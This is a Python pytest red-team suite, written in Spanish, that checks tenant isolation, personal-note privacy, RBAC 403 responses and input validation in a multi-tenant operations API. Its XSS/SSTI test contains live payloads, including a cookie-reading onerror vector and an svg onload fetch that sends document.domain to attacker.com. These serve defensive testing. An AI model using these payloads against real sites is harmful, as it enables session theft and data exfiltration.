"""
Vector Red Team: Actividades, Notas, Tareas, Horarios y Minuta OppyFy
(`tests/security_redteam/test_18_actividades_security_and_idor.py`):
Auditoría Ofensiva de Ciberseguridad, Aislamiento Multi-Tenant (Anti-IDOR),
Privacidad de Notas Personales, Validación de 'incompleta', Blindaje RBAC de 3 Niveles
y Sanitización contra Vectores Políglotas XSS/SSTI/Inyección.

Vectores de Ataque Auditados:
1. Vector 1: Anti-IDOR Cross-Tenant en Notas de Equipo, Tareas, Horarios y Minuta Traspaso.
2. Vector 2: Privacidad Estricta de Notas Personales entre Colaboradores del mismo Tenant.
3. Vector 3: Regla Inviolable de Justificación Obligatoria en Tareas Incompletas.
4. Vector 4: Verificación Exhaustiva de Guardias RBAC de 3 Niveles (403 Forbidden RFC 7807).
5. Vector 5: Detección y Bloqueo de Payloads Políglotas XSS, SSTI e Inyecciones Maliciosas.
6. Vector 6: Aislamiento Cross-Tenant en Horarios, Clonación Semanal y Auditoría Laboral.
"""
# mypy: disable-error-code="explicit-any"
from __future__ import annotations

from datetime import UTC, date, datetime, timedelta
from typing import Any

import httpx
import pytest

from src.core.exceptions import DomainValidationError, ResourceNotFoundError, SecurityValidationError
from src.core.security import create_access_token
from src.modules.operations.application.actividades_service import ActividadesService
from src.modules.operations.presentation.router_actividades import get_actividades_service

pytestmark = pytest.mark.security_redteam

TENANT_ALPHA = "tenant_seguridad_alpha"
TENANT_BETA = "tenant_seguridad_beta"
HOLDING_ID = "holding_security_audit"


def _create_token(
    user_id: int,
    tenant_id: str,
    permissions: list[str],
    *,
    explicit_denies: list[str] | None = None,
) -> str:
    """Genera token JWT firmado con contexto de tenant y permisos RBAC."""
    return create_access_token(
        user_id=user_id,
        holding_id=HOLDING_ID,
        tenant_id=tenant_id,
        tenant_schema=tenant_id,
        role_grants=permissions,
        explicit_denies=explicit_denies or [],
        accessible_tenants=[tenant_id],
        contracted_modules=["operations", "actividades"],
    )


def _make_headers(
    user_id: int,
    tenant_id: str,
    permissions: list[str],
) -> dict[str, str]:
    token = _create_token(user_id=user_id, tenant_id=tenant_id, permissions=permissions)
    return {
        "Authorization": f"Bearer {token}",
        "X-Tenant-ID": tenant_id,
    }


@pytest.fixture(autouse=True)
def _isolate_actividades_state() -> None:
    """Reinicia el estado en memoria antes de cada prueba de seguridad."""
    service = get_actividades_service()
    service.reset()


# ==============================================================================
# VECTOR 1: AUDITORÍA IDOR CROSS-TENANT
# ==============================================================================


@pytest.mark.asyncio
async def test_vector_01_cross_tenant_idor_isolation(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Asegura que un atacante autenticado en Tenant Beta NO pueda acceder,
    visualizar, modificar ni borrar notas, tareas o minutas pertenecientes a Tenant Alpha.
    """
    headers_alpha = _make_headers(
        user_id=1001,
        tenant_id=TENANT_ALPHA,
        permissions=[
            "actividades.notas.create",
            "actividades.notas.view",
            "actividades.notas.delete",
            "actividades.tareas.create",
            "actividades.tareas.view",
            "actividades.tareas.update",
        ],
    )
    headers_beta = _make_headers(
        user_id=2002,
        tenant_id=TENANT_BETA,
        permissions=[
            "actividades.notas.create",
            "actividades.notas.view",
            "actividades.notas.delete",
            "actividades.tareas.create",
            "actividades.tareas.view",
            "actividades.tareas.update",
        ],
    )

    # 1. Tenant Alpha crea nota de equipo confidencial
    res_crear_nota = await async_client.post(
        "/api/v1/actividades/notas/equipo",
        headers=headers_alpha,
        json={
            "titulo": "Receta Secreta Salsa Especial",
            "contenido": "Fórmula confidencial de salsa para el turno noche de Alpha.",
            "categoria": "produccion",
            "area_id": "cocina",
        },
    )
    assert res_crear_nota.status_code == 201
    nota_alpha_id = res_crear_nota.json()["id"]

    # 2. Tenant Alpha crea tarea operativa
    res_crear_tarea = await async_client.post(
        "/api/v1/actividades/tareas",
        headers=headers_alpha,
        json={
            "titulo": "Arqueo de caja fuerte Alpha",
            "descripcion": "Verificación de remanente en efectivo.",
            "urgencia": "alta",
            "area_id": "administracion",
        },
    )
    assert res_crear_tarea.status_code == 201
    tarea_alpha_id = res_crear_tarea.json()["id"]

    # 3. ATAQUE IDOR 1: Tenant Beta intenta listar notas de equipo -> NO debe ver la nota de Alpha
    res_list_notas = await async_client.get(
        "/api/v1/actividades/notas/equipo",
        headers=headers_beta,
    )
    assert res_list_notas.status_code == 200
    notas_beta = res_list_notas.json()
    assert all(n["id"] != nota_alpha_id for n in notas_beta)
    assert all("Receta Secreta" not in n["titulo"] for n in notas_beta)

    # 4. ATAQUE IDOR 2: Tenant Beta intenta marcar como leída la nota de Alpha -> 404 Not Found
    res_read_idor = await async_client.post(
        f"/api/v1/actividades/notas/equipo/{nota_alpha_id}/read",
        headers=headers_beta,
    )
    assert res_read_idor.status_code == 404

    # 5. ATAQUE IDOR 3: Tenant Beta intenta modificar la nota de Alpha -> 404 Not Found
    res_update_nota_idor = await async_client.put(
        f"/api/v1/actividades/notas/equipo/{nota_alpha_id}",
        headers=headers_beta,
        json={"titulo": "Nota saboteada por Tenant Beta"},
    )
    assert res_update_nota_idor.status_code == 404

    # 6. ATAQUE IDOR 4: Tenant Beta intenta eliminar la nota de Alpha -> 404 Not Found
    res_del_nota_idor = await async_client.delete(
        f"/api/v1/actividades/notas/equipo/{nota_alpha_id}",
        headers=headers_beta,
    )
    assert res_del_nota_idor.status_code == 404

    # 7. ATAQUE IDOR 5: Tenant Beta intenta listar tareas -> NO debe ver la tarea de Alpha
    res_list_tareas = await async_client.get(
        "/api/v1/actividades/tareas",
        headers=headers_beta,
    )
    assert res_list_tareas.status_code == 200
    tareas_beta = res_list_tareas.json()
    assert all(t["id"] != tarea_alpha_id for t in tareas_beta)

    # 8. ATAQUE IDOR 6: Tenant Beta intenta sabotear estado de tarea Alpha -> 404 Not Found
    res_patch_tarea_idor = await async_client.patch(
        f"/api/v1/actividades/tareas/{tarea_alpha_id}/estado",
        headers=headers_beta,
        json={"estado": "incompleta", "nota_incompleta": "Sabotaje cross-tenant"},
    )
    assert res_patch_tarea_idor.status_code == 404

    # 9. ATAQUE IDOR 7: Tenant Beta intenta borrar la tarea de Alpha -> 404 Not Found
    res_del_tarea_idor = await async_client.delete(
        f"/api/v1/actividades/tareas/{tarea_alpha_id}",
        headers=headers_beta,
    )
    assert res_del_tarea_idor.status_code == 404

    # 10. ATAQUE IDOR 8: Minuta OppyFy en Tenant Beta no debe filtrar datos de Tenant Alpha
    res_minuta_beta = await async_client.post(
        "/api/v1/actividades/minuta-traspaso",
        headers=headers_beta,
        json={"fecha": date.today().isoformat()},
    )
    assert res_minuta_beta.status_code == 200
    minuta_data = res_minuta_beta.json()
    assert "Receta Secreta" not in minuta_data["resumen_ejecutivo"]
    assert "caja fuerte Alpha" not in minuta_data["resumen_ejecutivo"]


# ==============================================================================
# VECTOR 2: PRIVACIDAD ESTRICTA DE NOTAS PERSONALES ENTRE COLABORADORES
# ==============================================================================


@pytest.mark.asyncio
async def test_vector_02_personal_notes_strict_privacy_between_collaborators(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Verifica que las notas personales sean privadas por colaborador dentro del mismo tenant:
    Un colaborador no puede leer, actualizar ni borrar notas personales de otro.
    """
    permisos_notas = [
        "actividades.notas.create",
        "actividades.notas.view",
        "actividades.notas.delete",
    ]
    # Dos usuarios del MISMO tenant
    headers_user_a = _make_headers(user_id=101, tenant_id=TENANT_ALPHA, permissions=permisos_notas)
    headers_user_b = _make_headers(user_id=102, tenant_id=TENANT_ALPHA, permissions=permisos_notas)

    # 1. Colaborador A crea su nota personal privada
    res_crear = await async_client.post(
        "/api/v1/actividades/notas/personales",
        headers=headers_user_a,
        json={
            "titulo": "Apunte privado de examen médico",
            "contenido": "Cita médica a las 15:00 hrs, pedir permiso al supervisor.",
        },
    )
    assert res_crear.status_code == 201
    nota_p_id = res_crear.json()["id"]

    # 2. Colaborador B lista notas personales -> Debe recibir lista vacía
    res_list_b = await async_client.get(
        "/api/v1/actividades/notas/personales",
        headers=headers_user_b,
    )
    assert res_list_b.status_code == 200
    notas_b = res_list_b.json()
    assert len(notas_b) == 0

    # 3. Colaborador A lista notas personales -> Sí ve su propia nota
    res_list_a = await async_client.get(
        "/api/v1/actividades/notas/personales",
        headers=headers_user_a,
    )
    assert res_list_a.status_code == 200
    notas_a = res_list_a.json()
    assert len(notas_a) == 1
    assert notas_a[0]["id"] == nota_p_id
    assert notas_a[0]["titulo"] == "Apunte privado de examen médico"

    # 4. ATAQUE: Colaborador B intenta modificar la nota personal de Colaborador A -> 400 DomainValidationError
    res_edit_b = await async_client.put(
        f"/api/v1/actividades/notas/personales/{nota_p_id}",
        headers=headers_user_b,
        json={
            "titulo": "Intento de modificación no autorizada",
            "contenido": "Texto alterado por otro usuario.",
        },
    )
    assert res_edit_b.status_code == 400
    assert "otro usuario" in res_edit_b.json().get("detail", "")

    # 5. ATAQUE: Colaborador B intenta eliminar la nota personal de Colaborador A -> 400 DomainValidationError
    res_del_b = await async_client.delete(
        f"/api/v1/actividades/notas/personales/{nota_p_id}",
        headers=headers_user_b,
    )
    assert res_del_b.status_code == 400
    assert "otro usuario" in res_del_b.json().get("detail", "")

    # 6. Colaborador A sí puede actualizar y eliminar su propia nota
    res_edit_a = await async_client.put(
        f"/api/v1/actividades/notas/personales/{nota_p_id}",
        headers=headers_user_a,
        json={"titulo": "Apunte privado actualizado"},
    )
    assert res_edit_a.status_code == 200
    assert res_edit_a.json()["titulo"] == "Apunte privado actualizado"

    res_del_a = await async_client.delete(
        f"/api/v1/actividades/notas/personales/{nota_p_id}",
        headers=headers_user_a,
    )
    assert res_del_a.status_code == 200
    assert res_del_a.json()["success"] is True


# ==============================================================================
# VECTOR 3: REGLA INVIOLABLE DE JUSTIFICACIÓN AL MARCAR 'INCOMPLETA'
# ==============================================================================


@pytest.mark.asyncio
async def test_vector_03_task_incompleta_mandatory_justification_enforcement(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Verifica que ninguna tarea pueda crearse o transicionar a 'incompleta'
    sin justificación válida en 'nota_incompleta' (rechaza vacío, whitespace, null).
    """
    headers = _make_headers(
        user_id=101,
        tenant_id=TENANT_ALPHA,
        permissions=[
            "actividades.tareas.create",
            "actividades.tareas.view",
            "actividades.tareas.update",
        ],
    )

    # 1. Intento de crear tarea directamente en 'incompleta' sin motivo -> Falla 400
    res_crear_invalida_1 = await async_client.post(
        "/api/v1/actividades/tareas",
        headers=headers,
        json={
            "titulo": "Limpieza de ducto de extracción",
            "estado": "incompleta",
            "nota_incompleta": "",
        },
    )
    assert res_crear_invalida_1.status_code == 400

    res_crear_invalida_2 = await async_client.post(
        "/api/v1/actividades/tareas",
        headers=headers,
        json={
            "titulo": "Limpieza de ducto de extracción",
            "estado": "incompleta",
            "nota_incompleta": "   ",
        },
    )
    assert res_crear_invalida_2.status_code == 400

    # 2. Crear tarea válida en estado pendiente
    res_crear_ok = await async_client.post(
        "/api/v1/actividades/tareas",
        headers=headers,
        json={"titulo": "Mantenimiento freidora 2", "estado": "pendiente"},
    )
    assert res_crear_ok.status_code == 201
    tarea_id = res_crear_ok.json()["id"]

    # 3. Transición a 'incompleta' con justificación vacía -> Falla 400
    res_patch_vacio = await async_client.patch(
        f"/api/v1/actividades/tareas/{tarea_id}/estado",
        headers=headers,
        json={"estado": "incompleta", "nota_incompleta": ""},
    )
    assert res_patch_vacio.status_code == 400
    assert "nota_incompleta" in res_patch_vacio.json().get("detail", "")

    res_patch_spaces = await async_client.patch(
        f"/api/v1/actividades/tareas/{tarea_id}/estado",
        headers=headers,
        json={"estado": "incompleta", "nota_incompleta": "   \t\n  "},
    )
    assert res_patch_spaces.status_code == 400

    # 4. Transición legítima a 'incompleta' con justificación clara -> 200 OK
    res_patch_ok = await async_client.patch(
        f"/api/v1/actividades/tareas/{tarea_id}/estado",
        headers=headers,
        json={
            "estado": "incompleta",
            "nota_incompleta": "Proveedor no despachó repuesto de resistencia a tiempo.",
        },
    )
    assert res_patch_ok.status_code == 200
    data_t = res_patch_ok.json()
    assert data_t["estado"] == "incompleta"
    assert data_t["completada"] is False
    assert data_t["nota_incompleta"] == "Proveedor no despachó repuesto de resistencia a tiempo."

    # 5. Intento de blanquear 'nota_incompleta' mientras la tarea sigue incompleta -> Falla 400
    res_put_wipe = await async_client.put(
        f"/api/v1/actividades/tareas/{tarea_id}",
        headers=headers,
        json={"nota_incompleta": "   "},
    )
    assert res_put_wipe.status_code == 400


# ==============================================================================
# VECTOR 4: CONTROL ESTRICTO DE RBAC DE 3 NIVELES (403 FORBIDDEN)
# ==============================================================================


@pytest.mark.asyncio
async def test_vector_04_rbac_3_level_permission_enforcement(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Verifica que usuarios sin los permisos requeridos reciban un 403 Forbidden RFC 7807
    en todas las acciones protegidas de notas, tareas y horarios.
    """
    # Token sin ningún permiso de actividades
    headers_no_perms = _make_headers(
        user_id=500,
        tenant_id=TENANT_ALPHA,
        permissions=["inventario.stock.read"],
    )

    # 1. Denegación en creación de notas de equipo
    res_nota_create = await async_client.post(
        "/api/v1/actividades/notas/equipo",
        headers=headers_no_perms,
        json={"titulo": "Nota no autorizada", "contenido": "Contenido bloqueado"},
    )
    assert res_nota_create.status_code == 403

    # 2. Denegación en listado de notas
    res_nota_view = await async_client.get(
        "/api/v1/actividades/notas/equipo",
        headers=headers_no_perms,
    )
    assert res_nota_view.status_code == 403

    # 3. Denegación en creación de tareas
    res_tarea_create = await async_client.post(
        "/api/v1/actividades/tareas",
        headers=headers_no_perms,
        json={"titulo": "Tarea no autorizada"},
    )
    assert res_tarea_create.status_code == 403

    # 4. Denegación en listado de tareas
    res_tarea_view = await async_client.get(
        "/api/v1/actividades/tareas",
        headers=headers_no_perms,
    )
    assert res_tarea_view.status_code == 403

    # 5. Denegación en gestión de horarios y turnos
    res_horario_manage = await async_client.post(
        "/api/v1/actividades/horarios",
        headers=headers_no_perms,
        json={"user_id": 101, "fecha_inicio": "2026-11-03"},
    )
    assert res_horario_manage.status_code == 403

    res_horario_view = await async_client.get(
        "/api/v1/actividades/horarios",
        headers=headers_no_perms,
    )
    assert res_horario_view.status_code == 403


# ==============================================================================
# VECTOR 5: PROTECCIÓN CONTRA INYECCIONES Y PAYLOADS MALICIOSOS (XSS/SSTI)
# ==============================================================================


@pytest.mark.asyncio
async def test_vector_05_polyglot_xss_and_malicious_injection_neutralization(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Inyecta vectores de ataque políglotas (XSS con <script>, onerror, onload, javascript:, SSTI)
    en títulos, contenidos de notas, descripciones y justificaciones de tareas,
    validando que sean bloqueados deterministamente con 422 SecurityValidationError.
    """
    headers = _make_headers(
        user_id=101,
        tenant_id=TENANT_ALPHA,
        permissions=[
            "actividades.notas.create",
            "actividades.notas.view",
            "actividades.tareas.create",
            "actividades.tareas.update",
        ],
    )

    malicious_payloads = [
        "<script>alert('XSS_POC')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg/onload=fetch('http://attacker.com/?steal='+document.domain)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "{{7*7}}",
        "${7*7}",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
    ]

    # 1. Ataque XSS en notas de equipo (título y contenido)
    for payload in malicious_payloads:
        res_xss_nota = await async_client.post(
            "/api/v1/actividades/notas/equipo",
            headers=headers,
            json={
                "titulo": f"Nota con inyección {payload}",
                "contenido": f"Cuerpo con vector {payload}",
            },
        )
        assert res_xss_nota.status_code == 422, f"Falló bloqueo de XSS para payload: {payload}"
        problem = res_xss_nota.json()
        assert problem.get("error_code") in ("XSS_PAYLOAD_BLOCKED", "SSTI_PAYLOAD_BLOCKED", "SECURITY_VALIDATION_FAILED", "OPPYTEC_DOMAIN_ERROR")

    # 2. Ataque XSS en notas personales
    res_xss_personal = await async_client.post(
        "/api/v1/actividades/notas/personales",
        headers=headers,
        json={
            "titulo": "Nota personal",
            "contenido": "<svg onload=alert(1)>",
        },
    )
    assert res_xss_personal.status_code == 422

    # 3. Ataque XSS en tareas operativas (título, descripción, nota_incompleta)
    res_xss_tarea = await async_client.post(
        "/api/v1/actividades/tareas",
        headers=headers,
        json={
            "titulo": "<script>alert(1)</script>",
            "descripcion": "Descripción normal",
        },
    )
    assert res_xss_tarea.status_code == 422

    # 4. Crear tarea limpia y probar inyección en nota_incompleta durante transición
    res_clean_task = await async_client.post(
        "/api/v1/actividades/tareas",
        headers=headers,
        json={"titulo": "Tarea limpia", "estado": "pendiente"},
    )
    assert res_clean_task.status_code == 201
    clean_task_id = res_clean_task.json()["id"]

    res_xss_incompleta = await async_client.patch(
        f"/api/v1/actividades/tareas/{clean_task_id}/estado",
        headers=headers,
        json={
            "estado": "incompleta",
            "nota_incompleta": "Falla de motor <img src=x onerror=alert(1)>",
        },
    )
    assert res_xss_incompleta.status_code == 422

    # 5. Verificación de contenido legítimo: Caracteres culinarios y operativos sin bloquear
    res_legitimo = await async_client.post(
        "/api/v1/actividades/notas/equipo",
        headers=headers,
        json={
            "titulo": "Mise en place & corte brunoise: 100°C",
            "contenido": "Producción de consomé al 50% de evaporación. Mantener entre 4° y 8°C.",
            "categoria": "produccion",
        },
    )
    assert res_legitimo.status_code == 201
    assert res_legitimo.json()["titulo"] == "Mise en place & corte brunoise: 100°C"


# ==============================================================================
# VECTOR 6: AISLAMIENTO CROSS-TENANT EN HORARIOS, CLONACIÓN Y AUDITORÍA LABORAL
# ==============================================================================


@pytest.mark.asyncio
async def test_vector_06_horarios_cross_tenant_isolation_and_labor_audit_integrity(
    async_client: httpx.AsyncClient,
) -> None:
    """
    Verifica que los turnos de horarios, la clonación de semanas y el cálculo de alertas laborales
    estén totalmente aislados por tenant sin fuga cruzada ni contaminación estadística.
    """
    headers_alpha = _make_headers(
        user_id=101,
        tenant_id=TENANT_ALPHA,
        permissions=["actividades.horarios.manage", "actividades.horarios.view"],
    )
    headers_beta = _make_headers(
        user_id=202,
        tenant_id=TENANT_BETA,
        permissions=["actividades.horarios.manage", "actividades.horarios.view"],
    )

    lunes_origen = date(2026, 11, 2)
    lunes_destino = date(2026, 11, 9)

    # 1. Tenant Alpha crea turno para el colaborador 101 el lunes de 09:00 a 17:00
    res_turno_alpha = await async_client.post(
        "/api/v1/actividades/horarios",
        headers=headers_alpha,
        json={
            "user_id": 101,
            "area_id": "cocina",
            "fecha_inicio": lunes_origen.isoformat(),
            "hora_inicio": "09:00:00",
            "hora_fin": "17:00:00",
            "color": "#1976d2",
        },
    )
    assert res_turno_alpha.status_code == 201
    turno_alpha_id = res_turno_alpha.json()["id"]

    # 2. Tenant Beta lista turnos -> NO debe ver el turno de Alpha
    res_list_turnos_beta = await async_client.get(
        "/api/v1/actividades/horarios",
        headers=headers_beta,
    )
    assert res_list_turnos_beta.status_code == 200
    turnos_beta = res_list_turnos_beta.json()
    assert all(t["id"] != turno_alpha_id for t in turnos_beta)

    # 3. Tenant Beta intenta clonar la semana hacia lunes_destino -> NO clona ningún turno de Alpha
    res_clonar_beta = await async_client.post(
        "/api/v1/actividades/horarios/clonar-semana",
        headers=headers_beta,
        json={
            "fecha_lunes_origen": lunes_origen.isoformat(),
            "fecha_lunes_destino": lunes_destino.isoformat(),
        },
    )
    assert res_clonar_beta.status_code == 201
    clonados_beta = res_clonar_beta.json()
    assert len(clonados_beta) == 0  # Tenant Beta no tenía turnos que clonar

    # 4. Tenant Alpha clona su semana -> Debe clonar exactamente su turno a la semana destino
    res_clonar_alpha = await async_client.post(
        "/api/v1/actividades/horarios/clonar-semana",
        headers=headers_alpha,
        json={
            "fecha_lunes_origen": lunes_origen.isoformat(),
            "fecha_lunes_destino": lunes_destino.isoformat(),
        },
    )
    assert res_clonar_alpha.status_code == 201
    clonados_alpha = res_clonar_alpha.json()
    assert len(clonados_alpha) == 1
    assert clonados_alpha[0]["user_id"] == 101
    assert clonados_alpha[0]["fecha_inicio"] == lunes_destino.isoformat()

    # 5. Auditoría de alerta laboral en Tenant Beta no debe ser afectada por turnos de Alpha:
    # Un usuario 101 en Tenant Beta crea turno de noche (18:00 a 02:00)
    # No debe chocar con el turno de 09:00 a 17:00 de Tenant Alpha
    res_alerta_beta = await async_client.post(
        "/api/v1/actividades/horarios/validar-alertas",
        headers=headers_beta,
        json={
            "user_id": 101,
            "fecha_inicio": lunes_origen.isoformat(),
            "hora_inicio": "18:00:00",
            "hora_fin": "02:00:00",
        },
    )
    assert res_alerta_beta.status_code == 200
    alerta_data = res_alerta_beta.json()
    # Si hubiera contaminación cross-tenant, reportaría descanso insuficiente de 1 hora entre 17:00 y 18:00
    assert any(a["tipo"] == "DESCANSO_INSUFICIENTE" for a in alerta_data["alertas"]) is False
